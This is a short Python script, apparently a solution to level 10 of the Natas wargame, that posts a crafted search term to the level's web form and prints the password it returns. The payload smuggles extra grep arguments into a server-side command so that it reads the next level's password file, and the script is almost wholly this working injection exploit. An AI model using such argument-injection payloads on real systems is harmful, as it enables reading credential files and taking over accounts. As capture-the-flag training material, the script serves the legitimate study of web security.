import re

from natas.lib import natas_session

session, url = natas_session(10)

payload = "-e [a-z] /etc/natas_webpass/natas11 #"

response = session.post(url, data={"needle": payload, "submit": "submit"})

regex = r"<pre>\n(.+)\n</pre>"
print(re.findall(regex, response.text)[0])
